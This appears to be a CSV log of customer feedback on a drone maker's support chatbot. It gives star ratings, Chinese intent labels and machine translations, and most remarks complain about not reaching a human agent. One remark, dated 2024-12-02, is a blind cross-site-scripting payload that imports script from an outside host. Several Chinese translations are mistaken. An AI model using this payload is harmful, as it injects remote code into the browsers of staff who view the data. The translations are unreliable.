售前/售后,英文/小语种,id,渠道channel,会话chatSessionId,客户名称customer,提交时间,remark,sessionId,starLevel,意图分类,翻译
售后,小语种,cf4e2a1d18adff1e36239f5c29f70001,kr_sp1,|82692473126885695631520,XNGRssrmuBZoY94OKcQq36mobBtE18oDhFnkBdD3yXM=,2024-11-04,믕답지연,gAcYwdnq6i/7MctOC77CMjqYNMs/Fql5tmwYQ1NFa7k=,1.0,服务不满,믕
售前,英文,64b956f99a0e059f3c97bc0650fcd9fa,na_store1,|82694346641234288498115,KmUG61dew1dZlrvI74ycTw==,2024-11-04,"When I click ""Connect to a live agent,"" I should not be sent to a virtual assistant.  Dead end.",7uy3j3ctLmxDeDHK5sp7WMMaHvQ6hHSTXoe9mALPUSY=,1.0,设备兼容,当我单击“连接到现场代理”时，我不应该对虚拟助手感到。  死胡同。
售后,小语种,448f1e33e35fac77d133a56798386118,de_sp1,|82692484752295891748256,CmiJbIqObPOa7JzhpDWfv3ZnmQY6/kN4f2pKc6sj3mw=,2024-11-04,,,,无效数据,
售后,英文,40e690425b4d94cdb8d2d46ee092f2db,eu_sp1,|82692085043427348149028,3aO7DjTUDl4dxq5wZJFzcZfxQ+1iPw9gBikD7gbScf8=,2024-11-05,Diastrous,NfOi4iD8mQCQNkDD66bi1G/P8rluZCSWDc9ZI4BYkWA=,1.0,服务不满,垂直
售前,英文,6068af451e44f58c0201dbc1650695ac,na_store1,|82691688547736217420285,nGJuqZdkEkCEGD1RDuVsmA==,2024-11-05,not traking my order 0017881305142,A66fv6xmeiYcxtS80cBmisqBLL/AEsreMgNkJ7koLNw=,1.0,购买咨询,不要订购我的订单0017881305142
售前,英文,e553df3e23087e81956c78c7926e040e,na_store1,|82691676868429610754804,PsxHnfb6vOz/uNFDqti6ujEwU4crpgx/SNznkRYAk8I=,2024-11-05,Actually be able to answer questions instead of directing me elsewhere.,ujC1Amn/X3sE9UNmBQix3UGBvuH6l9hhqb//YVwYIVw=,1.0,"服务不满,使用指导",实际上，能够回答引导我Elsewher的问题。
售后,英文,8c1eed852accec0d886ec128d973e344,eu_sp1,|82691627165458682568947,WCqByKoL1Qgn8YAv/mQd0l+MVSV8/xJ0XnCA5SxWJg8=,2024-11-05,"Hi, I have submitted a Video Verification for Care Refresh for a DJI Neo. Thanks, Ben",OzFAsXXSS/IpMSgdyG5ESlnINcw4jfY8zi2uipHAe1M=,5.0,"保修咨询,满意表扬,礼貌问候",嗨，我已经提交了视频验证，以刷新DJI NEO。谢谢，本
售前,英文,3c406699760273de79137b8704af885a,na_store1,|82692275360909679038874,WcJTh5lH2tjugmxxzURd3A==,2024-11-05,"I'm trying to change the ship to address of an item I've paid for with Papal, your system will not l",V/oNi+BthSKVpcvQZ1VGpmBAN2blbboQDo0KLW7Z1UA=,1.0,"物流配送,礼貌问候",我正在尝试更换船以加起来我用教皇付款的商品，您的系统不会L
售后,英文,fac3ce6cc6ed868c6c4597174c1cc2e0,au_sp1,|82691556704053230935307,cvH84cczVUMJ3RzJrNwLvtFNHfe412+SSdtXhTBDcC8=,2024-11-05,Make it not shit. ,K5WbGSv6awxqAZIIbPhbsqlG7v6VX2TLhVSJkitPSnk=,1.0,礼貌问候,让它不要屎。
售后,英文,ee51e8aad28ab2cd43a135bf31e1f55d,hcrepair,|82691547172113080642274,9vWoX4jNY0v17O/evrZKCg==,2024-11-05,"Hi, I saw that the drone was delivered,Could you please expedite the process as soon as possible?Thx",SGfefaKlGgbsYSmOPsnteJo5Ey+opgnqxkJt70FNteE=,3.0,"物流配送,礼貌问候",嗨，我看到无人机已交付，您能尽快体验一下该过程吗？谢谢
售后,英文,fdd1424e68b1ab6d527900e8c84e5f30,eu_sp1,|82691075655551299292533,V8oFqIsx6WN7fbV8W2wqQA==,2024-11-06,no options to direct the query to a real person and to many options that are not related ,/FexN7biKS5tUEevZOIoeBDQ5K2tKXVDA2fnbT9MvzQ=,1.0,服务不满,没有选项将查询引向真实的人，也没有选择与许多无关的选项
售前,小语种,6dcc03e8d79009461728b901bc0759b7,kr_store1,|82690966198551921390004,cD5A2kyWXTmO3o98t1kl6NIaMmz5kGbwOtaY8ksZAjw=,2024-11-06,,,,无效数据,
售前,英文,5c9c8902e6a846be5201287de18d90f8,na_store1,|82690860621437321629739,R4tzJQ8tbIMfbrygWUkbfEKwfkgVBfAhXyd6kNwZ0r8=,2024-11-06,Virtual assistant sucks here and everywhere,Pv9odMxg2FiYyonuItqIxSjrmj1WyZCXRXGQblG4G1M=,1.0,"服务不满,使用指导",虚拟助手在这里无处不在
售前,英文,9bd35373e7e5dbd81425d0fa308fa809,na_store1,|82690779577843686468071,5LAygjpO0lwgMpDJ/pniwg==,2024-11-06,Amazing. My issue is now resolved. Thank you,BB+51rQLXHrm9XKt2ecHLgNnYVd2Ht/GnKDg/K/rMMc=,5.0,"产品故障,满意表扬,礼貌问候",惊人的。我的问题现在已经解决。谢谢
售前,英文,f57bc7e59f8a5f7a1a24b38e262bf378,eu_store1,|82690097412051633216417,diYwVVOVlRrD0m9z1Z4Y8CFD3Z9SuK73z2/d7i6CZGg=,2024-11-07,irrelevant answers. ,gs9PnsTRgBBo5LfDplmMdMkT8uGUpCpC22fhFZDti5c=,1.0,服务不满,无关的答案。
售前,英文,46cb87bd8820d23b5a8ca241e3a2295c,na_store1,|82687860931688070820066,T8k+6KWywMb3yIPPrp6gTQ==,2024-11-10,"Wanted a human, didn’t get a human. Bad bot!",IC6UqpZpMnQ/TFa+u54VHZQZmxVaA7EqLwChqDObAdY=,1.0,服务不满,想要一个人，没有得到人类。糟糕的机器人！
售前,英文,c405e2801b4b6a85bdb000204fcdb24f,na_store1,|82687236469132866537000,lMxuFnQjC9u53T3IoPW6tg==,2024-11-10,Still working to get my question answered. ,5PgbLvKvVru4OjyLjMyMEZW7TbFfZMsKUyY709nVuks=,4.0,其他咨询,仍在努力使我的问题几年。
售后,英文,8b66130c28aa8588e3a23f7efd55ba42,eu_sp1,|82686676828093149637635,n7wNQhcMs0bxXi0ppU9Y9SWQdCHugCj3BcjmVr2/tM6ISpTigCrk+i8aFbRf9JrF,2024-11-11,Session was broken as assistant did not return to chat,N75nco6iHvwr87ZIzAkht2GffcM1wA7SeGuDt7meu1k=,1.0,"产品故障,设备维修,退换处理",会议被打破，因为助手没有回到猫
售后,英文,fc180a199357818a92d0cd3716dba3d9,na_sp1,|82686687073893408592931,lbs0Prr7a2nFbZeQVAnVBb0HRHTwDddzLXvX7MGhm0o=,2024-11-11,Disgrace,q/kV50bc+PFgOpIseZEhQcvFLy9uujPAvylKUAEXNck=,1.0,服务不满,耻辱
售后,英文,77f5a66c05d0c955b30ada738ce8b8cb,eu_fly1,|82687500570165635231400,YJGZuDZ9a2LXsb5yoLth7tD3bghVLQLrY+pS9jCpR1I=,2024-11-11,Actual agents to speak to or see the option to ,Q9C2lL55006OU7k5qK6h1hU0Cf+eEz4elw2AhRtm6Ck=,1.0,服务不满,与之交谈或查看选项的实际代理
售后,英文,9ff1194a8b2745ff6d06f558cf4441c4,na_sp1,|82685668526077529084527,uglZK+WOHtD4ppe6MFKwtyTBiW6vJqc1ox4wttATfUM=,2024-11-12,"i had one of the best experiences, i left the call feeling that i mattered, thank you",w+eEE1BPS9/KKpzlV00BZj6t3nb3Hor7lyLnRUMyHFs=,5.0,"满意表扬,礼貌问候",我有一个最好的经历之一，我留下了我重要的电话，那就是你
售后,小语种,04ada6b327c7d1c0a0a8876a9d30acbb,fr_sp1,|82686001113268232242216,UeF96BbllQ5eZI18n9QUBQlToxoc1ehObu4SH5gWdrU=,2024-11-12,"Bonjour , je un probleme avec la mise a jour 1.15.5 mon mavic air 2  ne fixe plus le GPS  ",Loa5wB1KqonO5bSfugra1oSph5QlT3iVTX9s+QUpIhs=,5.0,"产品故障,设备维修,设备丢失,礼貌问候",您好，我对更新1.15.5我的Mavic Air 2不再修复GPS有问题
售后,小语种,be781230390542fff8fd934f44912ff4,kr_sp1,|82686197010493656272603,T9W+jfppqFHLh+KvuhZ0KXN9DOriQLJxyeuk+jN+dVc=,2024-11-12,,,,无效数据,
售后,英文,9cd5a7e6a9a28d4d3d259b89a437f1ec,na_sp1,|82684758041765885345558,kTcgAlsTC/2pn7MLbNHCWcSfffpRHs2vp3ULey4vFrM=,2024-11-13,Extremely confusing when all I want to do is activate,TjF/uOJeo9t9jSg/s3SUUhTzzgZqAax3HgWPFTzRGyk=,1.0,激活设置,当我要做的就是活跃时，极度令人困惑
售后,英文,2ff6fdb6cd718acaa58cccfc40342319,na_sp1,|82684785526066565469151,CH7L78rNqcRWS7W4fafvdQ==,2024-11-13,i WANT A LIVE AGENT,BfBrXqIydQxhAUa5GHTGIoSpj+V3OjRItrOBivnDH9w=,1.0,服务不满,我想要一个现场代理商
售后,英文,2fa5512b303be62d2a262f32b9d04acf,eu_sp1,|82684926841651803512755,p9GaVCV6eN4GcFeOdk4mEA==,2024-11-13,I couldn't get to the real person,gNddG27/MjoT+zPnzdqlbICNTdsacx4rprc8+cEsbPg=,1.0,服务不满,我无法找到真实的人
售后,英文,035440777585f53d603421c9e796026b,eu_sp1,|82685178029568434168205,gzkmXKJBrKl6DKt8XqmA4ObsjsZcMQ/iAhWvEY5flAk=,2024-11-13,,,,无效数据,
售前,英文,57f5b1ac5bedbd06642e3191ecb984e9,na_store1,|82683916961526980632268,QC2yjcb+KOjyUYAtomiPdg==,2024-11-14,Virtual assistants like this one are useless. I was never even able to ask my question.,zA6Vw/EDQQZ9C+YhQIr6eYh36z5DeCkE+EndiUimqGM=,1.0,"服务不满,礼貌问候",像这样的虚拟助手是没有用的。我什至从来没有问我的问题。
售后,小语种,0ee23b9871c2c1e4e7218e1f552d90e7,kr_sp1,|82685229541355339958871,T9W+jfppqFHLh+KvuhZ0KXN9DOriQLJxyeuk+jN+dVc=,2024-11-14,,,,无效数据,
售前,英文,7cee12893b1cb1eb89524f4f336f0a83,au_store1,|82684424200668665490158,z2fN/e3J67CMVE9kZa1nXNCGJlkLsR8LeezhjEvkYXg=,2024-11-14,Amazing service . Communication and knowledge and humour ,FYEAsQLUZdEHbgooEEWg0sJ3XUD5J2eq1gvy6DpDnWI=,5.0,满意表扬,惊人的服务。沟通，知识与幽默
售后,英文,1d7f77c3615746be60549315d844a492,na_sp1,|82685385921532233487123,6pxpPWaOS9MxotZYsSQRTA==,2024-11-15,"Disappointing service is taking so long to get a shipping label. Not sure why, ",itHjR+6dp0H5hrWPPVTzogFK7OoiDsepCgTc1d3K9w0=,1.0,"APP使用,物流配送,礼貌问候",令人失望的服务需要很长时间才能获得运输标签。不知道为什么，
售前,小语种,c0d211df24e4f87d0487e35d829365fd,kr_store1,|82682835876375222773827,rZadLybGqPRV78Oj890B4Q==,2024-11-16,삼품이 소진되었음에도... 주문결제를 받고.... 그에 따른 비송지연에 실망....@~@,LGTwETrD1/1fiyHzZEUgvZxkEBPdMWuR5k4ira6h0hk=,3.0,其他咨询,即使这三个项目已经用尽了...我收到了订单付款。...我对延迟的延迟感到失望。
售前,小语种,12579a6cae31e341ddb2a656c4a6f4f8,kr_store1,|82682945764616704398889,rZadLybGqPRV78Oj890B4Q==,2024-11-16,신속하고 친절한 응대는 만족하나... 삼품 배송이 늦어지는 것에는 매우 실망.....ㅠㅠㅠ,LGTwETrD1/1fiyHzZEUgvZxkEBPdMWuR5k4ira6h0hk=,4.0,其他咨询,我对快速和友好的回应感到满意，但是...非常失望地延迟延迟交货.....ㅠㅠㅠ
售前,英文,4ccaa9751bf5d0ab144968f31bda2d27,na_store1,|82682314622069411739241,X8lMLOQsxbYRgzOCyCMSGzQTdpmC2gZSZJyKigV9BwY=,2024-11-16,,,,无效数据,
售后,英文,af284895304075b7030935c24499ef99,na_sp1,|82681742352806415976484,YP4o4rSoSCh6rWvu+pmEM8eRvXfaa3GXewRJZ76WVUU=,2024-11-17,Live agent ,SwhOKy65d737FoHVw65oVS7FZ7gWyhpgr+qEmivAoo0=,1.0,服务不满,现场代理
售前,小语种,766bbc99b42f7e6734ea199f6ba96c70,kr_store1,|82683614170872480515432,tzoIeBDg1jxnh7wV+kL3fdliDo86GGBT9WclskQlKf0=,2024-11-15,,,,无效数据,
售前,英文,2a456e43c52cbaf05d56fdaa2cb79f72,na_store1,|82680867648181123339067,HwO23+nnhBt5H9mlW94DgQ==,2024-11-18,I am sad my drone still doesn't work,rtA6Y2CPKdNbfsJzLBy7OLcgFWbjoEuMjObQWojrz44=,1.0,服务不满,我很难过，我的无人机仍然不起作用
售前,英文,35e00475fdfd6729c3b5200ce5c155e7,na_store1,|82681433987863908345638,Su1fHE8YqRLZ16kd1tYFTg==,2024-11-18,Answered promptly all my questions. ,7X66BntN1bAPnqJK7ufK9W4WPvbMROpklTxnQghNjBY=,5.0,满意表扬,迅速回答了我所有的问题。
售前,英文,cbe9db9c453d5c9984ef4eb8e1e616ee,eu_store1,|82679660061997902076015,IiNaibVgibLPJpAwPXFwbaGFWO7pJ8tl2O6zSwKfYMQ=,2024-11-19,Shocking service fobbed off and kept waiting first and last DJI product,afwxeOgANLGgnfxuXxmXGWYzghi4j18d3bFuLhuIQDE=,1.0,服务不满,令人震惊的努力，不断等待首先等待DJI产品
售后,英文,81cd23e02cb017d56f0dca6fc0889080,au_sp1,|82680169631758900029207,VaReu3mpTbw9rHKpEfoOUBFIo47B5nK687XtCLl2aJA=,2024-11-19,Got my application to unlock geo zone approved ,3rljEjO5qxRdpzTo7CVY0Hs+1wN7+fk4o76zFJUs3Q0=,5.0,APP使用,得到了我的申请，以解锁地理区域批准
售后,英文,4278ed364d311f6dbfc5fef273c27f18,en_other18,|82677800479011037499148,mlTivwCqyVTy0uZaZE9BTWDA1ZWBL+7obY9krQs8Xrc=,2024-11-21,Clearer instructions on warranties ,yEcdn9NoPCjE9DlIgu3JYdIRgAKjrl5OBu5g/t1q3tw=,3.0,使用指导,Clearere关于保证的说明
售前,英文,c2909bf5e9bfa3d37ec309e418a493e8,na_store1,|82677893101992810164685,R6aT0E3N0Amjd0CT5ss9wiDLss2hV65Ej/gygW0LfMU=,2024-11-21,I typed my questions three times and never connected. ,59uf5w1U6ZMtkd4DC4oLbokvQLAEUADeyyPSumn+HHI=,2.0,设备兼容,我键入了三遍问题，但从未连接。
售后,英文,ab0c91170cbec9ab29a39a5b2a85e883,fb_sp1,|82678036090046493041299,8QnggzSgCogOeh0ll6o7vA==,2024-11-21,,,,无效数据,
售后,小语种,368ae224685361d2428b8845d91883cf,kr_sp1,|82678101288878095942741,ncaq5YMNPC6M/VE9APbpCzxzX0//TqynKy1V07kF41M=,2024-11-21,,,,无效数据,
售后,英文,d57d49d9439dea9e7484ad0b9466d34f,fb_sp1,|82677483231951931689343,7UfRrCX/cd1xzvKxfC1njQ==,2024-11-22,doesnt work,G/QsaJrGA07TRX0Dlfn4OJdkx6JMTw8uVye4Fy4e2V0=,1.0,产品故障,不起作用
售前,英文,11a36a2c38499e13daf8c5f86c4a42a8,na_store1,|82676245086434604660827,HMwozd/7LmvuzF5+k7/hINRKCDAIOTJrMlP+v6ciIr4=,2024-11-23,,,,无效数据,
售前,小语种,af67d6f688a2c1b4caf6c0bb77a87b6b,kr_store1,|82676618583648327892034,PZELZrJ7+rJxsWctOKj9ctFZkAN5OMP5JSIrnxu3Jww=,2024-11-23,좋아요,jiwxG+SfYQoZwU39AZO2yFIx3Y5Srriiaby9UdM3L0Q=,5.0,满意表扬,伟大的
售后,英文,a067ebb1c9fc3462eb27e57d0d5f1afe,eu_sp1,|82675355466607721242401,14dyfgyFz3gCXn1hxhDss+6DEnc5ELKXhwIhakK2xfg=,2024-11-24,someone at work to answer me would help,mgPQXNRBdxZKVGDYsUhxwmLk/9yQZSGQXnTd7U45UBg=,1.0,"服务不满,使用指导",有人在工作回答我会有所帮助
售后,英文,072c9e9f922724e3c88bf32b433b580b,na_sp1,|82674364559815003381025,Peaxg+LnKzS+r/wbFBohmA==,2024-11-25,,,,无效数据,
售后,英文,237143a01cbf4544d53e8063e64a915b,na_sp1,|82674398090475911664968,yWgW4Nh1zhVC7TBe4HZTgnRjnFS5P2hCFlhefEK9W5U=,2024-11-25,Its not responsive,NxdE5+11XDw8tRza8QgR7tapcN4N+RsYja6ekn5L0I0=,1.0,服务不满,它没有反应
售后,英文,da6da581b5f76efd8e71622665e6dfb5,eu_fly1,|82675277317064052433913,O9fu4x4iqLKz3OQq0oS4MViQ8VIHeRIOAMerjgMijTg=,2024-11-25,At the time of flying the drone was accidentally fallen down and the gimbal was broken,h5LeiEKZDXQKBQwT5sViML2VrW+mHvxlVgdy9qDj7Pw=,5.0,"产品故障,设备维修",在飞行时
售后,英文,3c9070abeb36cfb79458d37a77794e11,eu_sp1,|82674730633507033677448,dbPjz/q8qRZNi7CHwrhdcqQkzlhhYV0Y0Hi/rdo6nWU=,2024-11-25,the screen just restarted before i could submit my message,CPy/A7jobTosDuW8xXHIAYofA4xy3TEiMjuG+J0+YH4=,1.0,服务不满,在我提交消息之前，屏幕刚刚重新启动
售后,英文,89bfa9bdff16813763c017ac38d9c3e1,eu_sp1,|82674789602378682575624,InT7ZQnlw1ArgJmEo1auL2LIGhvOHRp3FHY15MMm30g=,2024-11-25,no respons,Gh7HKoznfN5nS6NNIPJ1WRuil8qatywUxwlQEXR0mTE=,1.0,服务不满,没有回应
售前,英文,d1b525d6354482de0aa7810fe1513107,na_store1,|82674883664938203797695,FSHVCWVDU70x1jzcbB0keocOsOwdQV7gx78ko66/ozo=,2024-11-25,Air2s caused injuries ,y0qtQRleteIQfenbjv5AtPtg2plka7Zh5zptZ//YCBA=,1.0,服务不满,AIR2造成伤害
售后,小语种,89e3b94c5f957735b452263895d9dff1,kr_sp1,|82675054464623321874763,BOBX4h9DOYpXzzscyGvGzVEWAFZyvQTg4/oa+/dm9oU+I8kxKEnFNYQfDYH9dXbF,2024-11-25,빠른 응대,Hvq7Lkt/TZRr2TkoiL5qgTYga6t6HpcCB6uZ5X/uYcM=,5.0,满意表扬,快速响应
售后,英文,baef411f758ceb6c0859dbf32be30cbe,eu_sp1,|82673406784632004335029,/0zQ12A7Ab7o4xVg9A0T3zYJW0MQGFK2HMjAhkrqiRc=,2024-11-26,Your previous email support was excellent! WHY AI?,GCcBYBHhMQn8OfqqB5tW9PH6XYESWpVyqHmrmY/trtQ=,1.0,"设备兼容,满意表扬",您以前的电子邮件支持非常好！为什么AI？
售后,小语种,3c7a30a26f972dd73c77296329975ff9,de_sp1,|82673821232084170053094,surmeda6s59zMwV0u2tDS4rPJYGPyQzy7UlDXafEZa0=,2024-11-26,Kundensupport,7g47WsiIlNrrihbunY1Cpm6lr1ghZ6PK8c5500hetWE=,1.0,设备兼容,kundensupport
售前,英文,15e491e3f759b3625133384ecea4c245,na_store1,|82674151159321350226885,q4Py2pttyd3W9n0nzmfaySWpND8/kRMOft/N0M2w50k=,2024-11-26,Not able to address my issue ,nZOIDCbkSDr/lqmCue68MJDSKmJym9A85255pugeR0Y=,1.0,"产品故障,物流配送",值得注意的是解决我的问题
售后,英文,31011d7f36ff76187b3f781afae2eadf,eu_sp1,|82672833327369858181011,4xqGsvmqgF7ZSB/oBSb6OvJIK6Ic4Up34V5TAaSLJCg=,2024-11-27,"Downloaded the app, started it, selected mavic 2 (no enterprise on there) tried to connect, error!",pSAAzqeVGBrqod3Lz3eXaeE+T7Kp+VE5aI3ODPW0o4U=,1.0,"产品故障,APP使用,设备兼容",下载了该应用程序，启动了它，选择了Mavic 2（那里没有企业）试图连接，错误！
售前,英文,590d01f8f5c59e6558151889721f59c9,eu_store1,|82672974092493606974590,n5gHGmZLGe/8uIPaeMqWYuY1mtyUAqe/QuDkURaf0L4=,2024-11-27,,,,无效数据,
售后,小语种,6dd04d53e7ab331ee7e4a1115a88a5bb,kr_sp1,|82673230507468294552437,y49zXT2yFC1fdNmOvIhnK86+f5lXGJoWN3259yJPIPA=,2024-11-27,너무 친절하세요,VKFgu1lSRsvFtWOfrYqGRAX4hhqTKCzEYmiq+7ekhAk=,5.0,满意表扬,太好了
售后,英文,10587be079b93c5152dba90f0b94471c,eu_sp1,|82672685782653995830533,n0blwpyWKtgueTVvDkyxzd5WfwHkm4P+hlTJP+07Ptg=,2024-11-27,did not address my query,/x6M9Q0a9OW8bMgC7i0bFC9ud+zULpF+7ULwp6RmU8g=,1.0,物流配送,没有解决我的查询
售后,小语种,7808a757042352e4746ecfc18cba57a9,de_sp1,|82671684628324408758084,u7Nf+NZ6vyLF3+z/xG1xvg==,2024-11-28,bekomme gar keine Hilfe also überall,QEWINirWWUMu0mbmg8xoOf8EtRHYPGExajLT/j1qzi8=,1.0,礼貌问候,Bekomme Gar Keine Hilfe也
售后,英文,0ea6c0af5b8babf88eafa9817ac48dfd,na_sp1,|82671788162643677361461,vze8UGsmR8zOnG1V+3lPS8PVguI93lZ+vUzVRBnAe+M=,2024-11-28,You disconnect before I can ask my question,1gBrrz30/NA2/O6SUsrdVM9S1y6vlMLnQJ+jhIMoBM8=,1.0,设备兼容,您在我提出问题之前断开连接
售后,英文,89a92c58443ce43a7308069d3240383a,eu_sp1,|82672014055829696527123,XKtDHmGoRYTO5Nnht4M57Q==,2024-11-28,"As I'm asking if DJI RC 2 is compatible to DJI Mavic Air model 2019, I get confusing answers",lTZrLOAQR8pKSHfZHW5lsCf9bQB+ZsGDq9SggMGY4Nk=,1.0,设备兼容,当我询问DJI RC 2是否与DJI Mavic Air Model 2019兼容时，我得到了令人困惑的答案
售后,英文,cdcfe2718ec58353d092d220da044597,eu_sp1,|82672197923756694169981,WC85zd7RQbvMncxbhHMXmbZ1D6GdOl1qL0E4RkrR+Ss=,2024-11-28,Need to speak to a human just going around in circles like my drone!!,bXT/7Vvw2oLMhAEU3oGJRJRx3SADJ/JOpc0eF2sYS5w=,1.0,服务不满,需要与像我的无人机这样的人说话的人！
售后,英文,7c95e30812e140d68ff0baf487b141b1,na_sp1,|82670941040064133269613,1zWVcoLuFlvwptFFW+HJSyqGRdB6GNtjbiTk5UQBZHs=,2024-11-29,never got any service,PBisbx3DMoGa06DMB6jJnAIZOVtsMiexJpl0kWEFNBk=,1.0,服务不满,从未得到任何服务
售后,英文,906dad75b139ae7214796b04824e5e93,na_sp1,|82670951186028177191477,53MALNnSRGFt6PvwKK7UMTBAnjU0nzBE8HhTorNupKk=,2024-11-29,Prream was super helpful ,PPWZPaJxe+jIH0DthF03qb6wQnVqiQGpsWMZ06J+uJM=,5.0,满意表扬,PRREAM非常有帮助
售后,英文,0e7b41f60d6cb14e74a75f54dcf9ad92,eu_sp1,|82671170871731565974507,voDxeAiPXrzSyGzU0ZetHA==,2024-11-29,"Bonjour, sur le chargeur 3 batteries Néo, une des batterie affiche un seul voyant depuis 40 minutes ",WE5FP+8X4q8bAcvsMF+TqgDava9rIzQeUWJbw2sBwmw=,5.0,礼貌问候,您好，在3个NEO电池充电器上，其中一个电池只有一个光线之一40分钟
售后,英文,2050646bd95694fed2decc5ac929ea45,eu_sp1,|82671303940165548363630,pg60hkg37NvW2Yye3EAMnA==,2024-11-29,"no response
",7QSrIopm/ZBnhHRDUAyV+xa6HnOS8jPs8fF+CxBqIDM=,1.0,服务不满,没有责任
售后,英文,7710bfb4a7b8a0c278f1be1a9fd121cf,eu_sp1,|82670285995313463528927,ZneWHn6U2fDMz+R6qnOR8ZCH+/tYHXpJ5MR6/uMvs14=,2024-11-30,I was typing to describe the ptoblem and you have just deleted several minutes of my effort!,5ctszqg3+1Ff5zpeF3Yodzg81CyvVeUH6muwul80df4=,1.0,服务不满,我正在打字来描述问题，您刚刚删除了几分钟的努力！
售前,英文,454d6033676f7b8e0da4f89fb124a379,fb_store1,|82670621453987051099827,d5UTOLlyrHwxaKykyZOfW5DIbW/7QmanoCe77EzFD9Q=,2024-11-30,Good ,eUVLXF0uBEezMytL2ltxicQrnh642Khau9zXwY4Wy9Y=,5.0,满意表扬,好的
售后,英文,6359b09231193372f3428ac95753501e,eu_sp1,|82669364105889977157273,JEbxMgn7qdTgrKRARpQrlw==,2024-12-01,I was typing a long message and suddenly the chat stopped! Where is all the text I already typed?!?!,oG+ptgLaccXthHnWGLbS282QZGE3pNsAyy35WCw8szw=,1.0,"服务不满,使用指导",我在输入一条很长的消息，突然猫停了下来！我已经键入的所有文字在哪里？！？！
售后,英文,df4c88b688f48343510e42ea2dd4c12e,au_sp1,|82669567490458865072495,89FD6YzqhIf9PB3pfbtuSXtXXj6ffPtpDaeCTxnx9to=,2024-12-01,Very easy to locate where to go. ,E9wchq1cS8EDfWMxf53QrOP8dbdNpU896dS3sTppWvU=,5.0,"设备丢失,使用指导",很容易找到去哪里。
售后,英文,476cfb04b2749855e844ea6824722ef3,eu_sp1,|82668185319907068182349,gO768tm1LiEZ5pWRRYPj8hsVJuClDUWaonMA04Ck6aw=,2024-12-02,It did not answer my question at all ,XaaTU3qytg4qljta/50zMEqgBClpJckchRB18dmc8Kk=,1.0,服务不满,它根本没有回答我的问题
售后,英文,5b27bf3ad01ff294fd1e3bc381a265b6,en_other18,|82668212691137651410946,gO768tm1LiEZ5pWRRYPj8hsVJuClDUWaonMA04Ck6aw=,2024-12-02,It didn’t answer my question at all ,XaaTU3qytg4qljta/50zMEqgBClpJckchRB18dmc8Kk=,1.0,服务不满,它根本没有回答我的问题
售后,英文,d47c298b56bcab9fb7f79bdc118e3707,na_sp1,|82668226698147905472631,8FmXBd9aq3Me4MiAQsi+H9nMcqCHOoneYPYY9+INmQ0=,2024-12-02,You don't seem to have any support for Agras drones,a5T4Z/lNLlNcunEou+Wpq3yWKZb1p7hXZmIUAjvvYNw=,1.0,设备兼容,您认为似乎对Agras无人机有任何支持
售前,英文,1fda6e138f25b4054b5def2159c32251,na_store1,|82669177946196908649548,kXfxKdPUblZ8712AUKY6e/agMf98oWLbuOlbIMb6lCU=,2024-12-02,Only people can do this job,fRv0AIq4rCBr4xKcGxJ0Nj6WylpnHfywILjtxFiB7hU=,1.0,礼貌问候,只有人们才能做这项工作
售后,英文,f248651680aa589836dc1907235db998,na_sp1,|82668364178965114797396,RHH0bhtpAAIbvyq9EVyQ1g==,2024-12-02,"I clicked the button to start a live chat, but the dumb AI said, "" I can only handle text requests.""",VB9pwLkvePUqSS+J8XYyDrGnm9Rs4mlvla3lnc8sHjY=,1.0,服务不满,我单击按钮启动活猫，但愚蠢的人工智会说：“我只能处理文本请求。”
售后,英文,b25fa4c8eb696d1037ac2e7f2c1d4d35,en_other18,|82668330124231202818974,fH2dOcaDCk2wRHEDotam35R4EZjKB0Rxx+ao2bbIZ+8=,2024-12-02,"'/*\'/*""/*\""/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=18163/.source))//>",CfZ+dAoG5uq1iK2/rby/8J6juMWRiPlcJzqBMeGnfDc=,4.0,使用指导,'/*\'/*“/*\”/*</crippt> <input/autofocus/onfocus =/**/（import（/https：\\ x55.is?1=18163/.source））//>
售前,英文,7b2bec2c4de18b3dc195a1e66f0ad1c9,na_store1,|82668322141009965478921,D8bg/YjzMsJfLDD3R8r3vA==,2024-12-02,Do you send the products to other country? ,pJRKU2qWHvDe8WbStzhpCSrKntn9vKwy//VRSyGLT1g=,5.0,"满意表扬,使用指导",您是其他国家的产品吗？
